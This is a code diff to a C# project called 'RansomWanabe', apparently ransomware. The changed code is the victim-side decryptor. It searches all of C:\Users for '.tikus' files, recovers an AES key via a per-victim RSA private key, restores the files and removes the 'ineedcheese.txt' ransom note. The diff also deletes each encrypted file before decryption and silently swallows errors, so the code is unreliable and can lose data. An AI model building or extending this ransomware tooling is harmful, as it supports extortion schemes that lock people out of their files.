@@ -272,18 +272,49 @@ namespace RansomWanabe
             }
         }
 
+        private static readonly string ransomFormat = ".tikus";
+        private static Dictionary<DirectoryInfo, List<string>> validDirs = new Dictionary<DirectoryInfo, List<string>>();
+        private static List<string> logger = new List<string>();
+        static void RecursiveSearch(string root)
+        {
+            string[] files = null;
+            string[] subDirs = null;
+
+            // First, process all the files directly under this folder 
+            try
+            {
+                files = Directory.EnumerateFiles(root).Where(x => Path.GetExtension(x).Equals(ransomFormat)).ToArray();
+            }
+            catch (UnauthorizedAccessException e)
+            {
+                logger.Add(e.Message);
+            }
+            catch (System.IO.DirectoryNotFoundException e)
+            {
+                Console.WriteLine(e.Message);
+            }
+
+            if (files != null)
+            {
+
+                validDirs.Add(new DirectoryInfo(root), files.ToList());
+                subDirs = Directory.GetDirectories(root);
+
+                foreach (string dir in subDirs)
+                {
+                    RecursiveSearch(dir);
+                }
+            }
+        }
 
         static void Main(string[] args)
         {
 
             //var publicKey = GetKey.GetPublicKey();
-            var baseDir = $@"C:\Users\{userName}\Desktop";
+            var baseDir = $@"C:\Users";
+            Console.WriteLine(baseDir);
 
-            string ransomFormat = ".tikus";
-
-            var blockList = new List<string> { "exe", "tikus", "key", "pub" };
-
-            var userDesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+            //var userDesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
 
             if(!IsElevated)
             {
@@ -291,12 +322,11 @@ namespace RansomWanabe
             }
             else
             {
-
                 if (Directory.Exists(baseDir))
                 {
                     try
                     {
-                        var targetDirs = Directory.EnumerateFiles(baseDir, "*.*", SearchOption.AllDirectories);
+                        
 
                         var privateKey = GetKey.GetPrivateKey(uid);
 
@@ -307,34 +337,44 @@ namespace RansomWanabe
 
                         byte[] aes_iv = Asymmetric.RSA.Decrypt(GetKey.GetAESIV(uid), privateKey);
 
+                        RecursiveSearch(baseDir);
+
                         //decrypt with this
-                        foreach (var file in targetDirs.Where(x => x.EndsWith(ransomFormat)))
+                        foreach (var dir in validDirs.Values)
                         {
-                            var decryptedFile = Path.GetFileNameWithoutExtension(file);
-                            var outputFile = Path.Combine(Path.GetDirectoryName(file), Path.GetFileNameWithoutExtension(file));
-                            var ransomNotePath = $"{Path.GetDirectoryName(file)}\\ineedcheese.txt";
-
-                            if (!File.Exists(decryptedFile))
+                            foreach (var file in dir)
                             {
-                                var fileContent = File.ReadAllBytes(file);
+                                Console.WriteLine(file);
+                                var decryptedFile = Path.GetFileNameWithoutExtension(file);
+                                var outputFile = Path.Combine(Path.GetDirectoryName(file), Path.GetFileNameWithoutExtension(file));
+                                var ransomNotePath = $"{Path.GetDirectoryName(file)}\\ineedcheese.txt";
 
-                                File.Delete(file);
+                                if (!File.Exists(decryptedFile))
+                                {
+                                    var fileContent = File.ReadAllBytes(file);
+                                    File.Delete(file);
 
-                                //var decrypted = Decompress(Asymmetric.RSA.Decrypt(fileContent, privateKey));
-                                var decrypted = AES.AESDecrypt(fileContent, aes_key, aes_iv);
+                                    //var decrypted = Decompress(Asymmetric.RSA.Decrypt(fileContent, privateKey));
+                                    try
+                                    {
+                                        var decrypted = AES.AESDecrypt(fileContent, aes_key, aes_iv);
+                                        File.WriteAllBytes(outputFile, decrypted);
 
-                                File.WriteAllBytes(outputFile, decrypted);
+                                        if (File.Exists(ransomNotePath))
+                                            File.Delete(ransomNotePath);
 
-                                if (File.Exists(ransomNotePath))
-                                    File.Delete(ransomNotePath);
+                                    }
+                                    catch
+                                    {
+                                    }
 
+                                }
                             }
 
                         }
                     }
                     catch
                     {
-
                     }
             
                 }
